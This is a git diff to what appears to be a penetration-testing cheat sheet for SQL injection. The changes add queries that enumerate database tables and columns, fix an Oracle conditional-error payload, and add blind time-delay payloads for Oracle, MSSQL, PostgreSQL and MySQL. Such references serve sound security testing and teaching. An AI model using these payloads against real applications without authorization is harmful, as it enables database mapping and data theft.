@@ -47,7 +47,7 @@ If you can see the output of your SQL query then this is the best way to exploit
 ```
 **Get database versions**:
 ```sql
---MySQL, Microsoft
+--MySQL, Microsoft (MSQL)
 SELECT @@version
 --PostgreSQL
 SELECT version()
@@ -55,16 +55,33 @@ SELECT version()
 SELECT banner FROM v$version
 SELECT version FROM v$instance
 ```
-
+### Get all tables
+**Oracle:**
+```sql
+SELECT * FROM all_tables
+```
+**MSQL, PostgreSQL, MySQL:**
+```sql
+SELECT * FROM information_schema.tables
+```
+### Get all columns
+**Oracle:**
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+**MSQL, PostgreSQL, MySQL:**
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
 
 ## Blind SQLi
 If you cant see the output of your query then try these （￣︶￣）↗　
 *These are not copy-pastable , you'll need to modify them to fit your already-working injection*
 
-### Check your query triggers an error response from the application
+### Check your query can trigger an error response from the application
 **Oracle:**
 ```sql
-SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)
+SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
 ```
 **MSQL:**
 ```sql
@@ -80,8 +97,19 @@ SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
 ```
 
 ### Check your query can cause a time delay in the application
-
-
-**If it does not seem to return specific results depending on your injection...**
-- ...and it does not seem to be modifying the response of the application in any way, check out 
-- ...and your query triggers a boolean response from the application (i.e. 200/500, or a generic success/fail message in the page), check out
+**Oracle:**
+```sql
+SELECT CASE WHEN (1=2) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+```
+**MSQL:**
+```sql
+IF (1=1) WAITFOR DELAY '0:0:10' 
+```
+**PostgreSQL:**
+```sql
+SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
+**MySQL:**
+```sql
+SELECT IF(1=1,SLEEP(10),'a')
+```
